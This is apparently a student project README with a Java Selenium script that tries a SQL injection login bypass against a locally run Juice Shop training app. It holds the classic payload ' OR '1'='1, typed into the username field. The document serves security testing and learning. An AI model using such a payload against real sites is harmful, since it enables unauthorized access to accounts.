# Selenium SQL Injection Test for Juice Shop

## Overview

This project demonstrates an SQL Injection attack test on the Juice Shop web application using Selenium WebDriver with Firefox. The test script attempts to log in using an SQL injection payload to check the vulnerability of the application.

## Assumptions

1. **Juice Shop Setup**: The Juice Shop application is running locally at `http://localhost:3000/`.
2. **Browser**: Mozilla Firefox is installed on the system.
3. **GeckoDriver**: GeckoDriver is installed and its path is correctly set in the script (`D:/internship_java/geckodriver.exe`).

## Approach

1. **Setup**: Initialize the WebDriver and configure it to use Firefox.
2. **Navigate to Login Page**: Open the Juice Shop login page.
3. **SQL Injection Payload**: Use a malicious username (`' OR '1'='1`) to attempt an SQL injection attack.
4. **Submit Form**: Enter the payload in the username field, provide a valid password, and submit the form.
5. **Analyze Response**: Check the response to determine if the SQL injection succeeded.
6. **Exception Handling**: Handle any potential exceptions that may occur during the test execution.

## Test Execution Steps

1. **Initialize WebDriver**: 
   - Set the path for GeckoDriver.
   - Configure Firefox options.

2. **Navigate to Juice Shop**:
   - Open `http://localhost:3000/`.
   - Ensure the page loads by checking the title contains "Juice Shop".

3. **Perform SQL Injection**:
   - Locate the username and password fields.
   - Enter the SQL injection payload in the username field and a valid password.
   - Submit the login form.

4. **Analyze Response**:
   - Check if the response contains "Invalid username or password" or "Welcome" to determine if the SQL injection was successful.

5. **Exception Handling**:
   - Use `try-catch` blocks to handle exceptions such as `NoSuchElementException` or `TimeoutException`.
   - Log exceptions for debugging purposes.

## Code

```java
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.firefox.FirefoxOptions;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.util.concurrent.TimeUnit;

public class JuiceShopSQLiTest {

    public static void main(String[] args) {
        // Set the path for the GeckoDriver
        System.setProperty("webdriver.gecko.driver", "D:/internship_java/geckodriver.exe");

        // Initialize WebDriver
        FirefoxOptions options = new FirefoxOptions();
        WebDriver driver = new FirefoxDriver(options);

        try {
            // Navigate to the login page
            String localLoginPageUrl = "http://localhost:3000";
            driver.get(localLoginPageUrl);

            // Locate the username and password input fields
            WebElement usernameField = driver.findElement(By.name("username"));
            WebElement passwordField = driver.findElement(By.name("password"));

            // Construct the SQL injection payload
            String maliciousUsername = "' OR '1'='1";
            String validPassword = "password"; // Replace with an actual valid password

            // Enter the malicious username and password
            usernameField.sendKeys(maliciousUsername);
            passwordField.sendKeys(validPassword);

            // Submit the form
            WebElement loginButton = driver.findElement(By.cssSelector("input[type='submit']"));
            loginButton.click();

            // Wait for the response
            driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS);

            // Analyze the response
            WebElement body = driver.findElement(By.tagName("body"));
            String bodyText = body.getText();

            if (bodyText.contains("Invalid username or password")) {
                System.out.println("SQL Injection attempt failed.");
            } else if (bodyText.contains("Welcome")) {
                System.out.println("SQL Injection attempt succeeded.");
            } else {
                System.out.println("Unexpected response.");
            }

            // Now navigate to the Juice Shop website
            String juiceShopUrl = "http://localhost:3000/";
            System.out.println("Navigating to: " + juiceShopUrl);
            driver.get(juiceShopUrl);

            // Wait for the page to load completely
            WebDriverWait wait = new WebDriverWait(driver, 15);  // Increased timeout
            wait.until(ExpectedConditions.titleContains("Juice Shop"));

            // Find the login button and attempt to click it
            WebElement juiceShopLoginButton = driver.findElement(By.id("loginButton"));

            // Wait for the overlay to become invisible or clickable
            wait.until(ExpectedConditions.invisibilityOfElementLocated(By.id("mat-dialog-0")));

            // Click on the login button
            juiceShopLoginButton.click();

            // Perform further actions after successful login click
            // For example, enter username, password, and submit the form

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            // Close the browser
            driver.quit();
        }
    }
}
```

## Exception Handling

- **TimeoutException**: Handled by increasing the wait time to allow the page to load.
- **NoSuchElementException**: Handled by verifying the element locators and ensuring the application is correctly loaded.
- **General Exceptions**: Caught using a generic `catch` block to log any unexpected errors during test execution.

## Conclusion

This test script demonstrates an automated approach to testing for SQL injection vulnerabilities using Selenium WebDriver. Ensure the Juice Shop application is running and accessible, and that GeckoDriver and Firefox are correctly installed and configured on your system.

![login page](https://github.com/arjun98k/java_selenium_task/blob/main/login%20page.png)

![invalid username password](https://github.com/arjun98k/java_selenium_task/blob/main/invalid_username_password.png)


![sqli test logs of terminal](https://github.com/arjun98k/java_selenium_task/blob/main/logs%20of%20terminal.png)
